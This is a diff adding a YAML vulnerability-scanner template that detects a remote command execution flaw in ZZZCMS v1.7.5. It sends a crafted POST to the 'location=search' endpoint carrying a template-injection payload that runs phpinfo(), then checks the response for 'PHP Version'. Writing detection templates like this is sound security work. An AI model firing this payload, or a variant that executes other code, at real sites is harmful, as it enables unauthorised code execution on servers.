@@ -1,0 +1,28 @@
+id: zzzcms-rce-v1_7_5
+
+info:
+  name: ZZZCMS v1.7.5 Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects the remote command execution vulnerability in ZZZCMS v1.7.5 through crafted POST requests to the 'location=search' parameter.
+  tags: rce, critical, zzzcms, cms
+
+http:
+  - raw:
+      - |
+        POST /?location=search HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        keys={if:=phpinfo()}{end if}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Version" # Common string in phpinfo output
+        part: body
+      - type: status
+        status:
+          - 200
